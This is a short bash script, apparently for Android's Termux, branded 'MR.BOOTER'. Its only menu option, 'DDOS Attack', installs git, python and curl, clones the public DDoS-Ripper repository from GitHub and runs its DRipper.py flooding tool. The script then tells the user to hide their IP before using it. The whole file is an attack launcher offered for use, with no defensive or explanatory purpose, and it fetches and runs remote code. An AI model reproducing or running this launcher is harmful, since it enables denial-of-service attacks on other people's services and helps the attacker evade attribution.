#!/bin/bash
clear
mkdir -p Tools
clear

# ░▒▓ style ASCII banner for MR.BOOTER
echo -e '\033[31;40;1m

█▀▄▀█ █▄▄▄▄  ███   ████▄ ████▄    ▄▄▄▄▀ ▄███▄   █▄▄▄▄ 
█ █ █ █  ▄▀  █  █  █   █ █   █ ▀▀▀ █    █▀   ▀  █  ▄▀ 
█ ▄ █ █▀▀▌   █ ▀ ▄ █   █ █   █     █    ██▄▄    █▀▀▌  
█   █ █  █   █  ▄▀ ▀████ ▀████    █     █▄   ▄▀ █  █  
   █    █ ██ ███                 ▀      ▀███▀     █   
  ▀    ▀                                         ▀    
                                                      

\033[0m'

# Coded info
echo -e "Coded by Tray | Discord: got2muchbandz_"
echo -e "\033[33;4mCTRL+C:\033[0m exit"

# Menu
echo -e "\e[37m[01]\e[36m DDOS Attack"

# Option Selection
read -p "Transaction number: " islem

if [[ $islem == 01 || $islem == 1 ]]; then
    clear
    echo -e "Installing update and requirements..."
    sleep 2
    pkg install git -y
    pkg install python python3 -y
    pkg install pip pip3 -y
    pkg install curl -y
    apt update
    apt upgrade -y
    clear
    echo -e "Full update completed."
    sleep 1
    clear
    cd Tools
    git clone https://github.com/palahsu/DDoS-Ripper.git
    cd DDoS-Ripper
    python3 DRipper.py
    echo ""
    echo -e "Before using it, hide your IP."

else
    clear
    echo -e "You entered the wrong code."
    sleep 1
    clear
    bash $0
fi
